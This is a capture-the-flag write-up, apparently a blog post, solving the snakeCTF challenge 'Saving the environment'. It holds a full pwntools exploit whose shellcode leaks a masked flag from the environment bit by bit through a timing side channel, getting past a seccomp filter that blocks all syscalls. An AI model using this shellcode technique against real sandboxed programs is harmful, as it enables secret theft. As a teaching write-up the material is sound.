---
title: "Saving the environment"
date: "2025-09-08"
tags: ["snakeCTF", "seccomp", "timing", "shellcode"]
---

This challenge gives us a program that prints the environment variables of whoever runs it.\
The user that runs the binary on remote has the variable `FLAG=laflag`, which holds the flag I want. It looks like I just have to run the program and that is it, but if I do, where the flag should show up I get `FLAG=... Lets not print this one...`.  This is why:

The program runs this loop:

```c
found_flag = false;
for (i = 0; envp[i] != (char *)0x0; i = i + 1) {
    check = strncmp(envp[i],"FLAG=",5);
    if (check == 0) {
        puts("FLAG=... Lets not print this one...");
        found_flag = true;
    }
    else {
        puts(envp[i]);
    }
}
if (!found_flag) {
    puts("Error: FLAG not found in environment variables");
    exit(1);
}
```

It checks every line it prints and, if it contains `FLAG=`, it shows other text instead.

Looking at how the program works, after printing the variables it asks for 2 inputs:

```c
puts("Environment Variables:");
print_env(envp);

code_len = 0;
__isoc99_scanf("%u", &code_len);

if (0x200 < code_len) {
    puts("You'd like uh");
    exit(1);
}
```

First it asks for a size.

```c
read(0, code_buffer, (ulong)code_len);
```

Then it asks for the content. And looking a bit further back:

```c
code_buffer = (byte *)mmap((void *)0x500000,0x200,7,0x22,-1,0);
```

The area where it is stored is a memory region with execute permissions.

On top of that, the program runs the code in that area:

```c
(*(code *)code_buffer)(0,0,0,0,0,0);
```

Since I have control there, it looks like I can just do a ret2syscall. But the program does this:

```c
seccomp_filter = seccomp_init(0);
seccomp_rule_add(seccomp_filter,0,1,0);
seccomp_rule_add(seccomp_filter,0,0,0);
seccomp_load(seccomp_filter);
seccomp_release(seccomp_filter);
```

These are **seccomp** filters that limit what can be called. In this case, using the [Seccomp Tools](https://github.com/david942j/seccomp-tools) tool I can see that **every syscall is blocked**:

```c
line  CODE  JT  JF  K
=================================
0000: 0x20  0x00 0x00 0x00000004 A = arch
0001: 0x15  0x00 0x03 0xc000003e if (A != ARCH_X86_64) goto 0005
0002: 0x20  0x00 0x00 0x00000000 A = sys_number
0003: 0x35  0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15  0x00 0x00 0xffffffff /* no-op */
0005: 0x06  0x00 0x00 0x00000000 return KILL
```

The program runs my shellcode but I cannot make a single syscall, so the idea is to **build a timing based attack** to leak the flag bit by bit using conditionals and loops.

For that I need the memory address of the flag.\
I know that on remote the flag is on line 5 of the environment variables. If I manage to leak that same line locally, even if it is not the real flag, I can work out the offset I need to reach it on remote. With GDB I can get that offset by comparing against `rbp`.

The rest is writing a shellcode that reads each byte and lets me rebuild the flag character by character.

```python
#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./chall")

context.binary = exe
context.terminal = ["kitty"]
context.log_level = 'error'
gdbscript = """
b *0x401471
c
"""

def get_bit(offset, bit):
    p = process(exe.path)
    #p = gdb.debug(exe.path, gdbscript)

    shellcode = asm(f'''
        mov rdi, [rbp + 0x150]
        xor rax, rax
        xor rbx, rbx

        mov al, byte ptr [rdi + {offset}]
        mov bl, {1 << bit}
        and al, bl

        imul rax, 0x20000000
    loop_start:
        cmp rax, r11
        je loop_finished
        inc r11
        imul ebx, 0x13
        jmp loop_start
    loop_finished:
        syscall
    ''', arch='amd64')
    
    p.recv(timeout=0.2)
    p.sendline(str(len(shellcode)).encode())
    p.send(shellcode)
    start_time = time.time()

    try:
        p.recvall(timeout=2)
    except EOFError:
        pass
    now = time.time()
    diff = now - start_time
    print(diff)

    if diff > 0.5:
        return 1
    else:
        return 0

flag = ''
offset = 0
while '}' not in flag:
    bits = []
    for i in range(8):
        bits.append(get_bit(offset, i))

    byte_completo = 0
    for bit in reversed(bits):
        byte_completo = (byte_completo << 1) | bit

    flag += chr(byte_completo)
    print(f"Flag parcial: {flag}")
    offset += 1

print(f"Flag final: {flag}")
```

```bash
$ python3 solve.py
Flag parcial: s
Flag parcial: sn
Flag parcial: sna
Flag parcial: snak
Flag parcial: snake
. . .
Flag final: snakeCTF{SECRET}
```
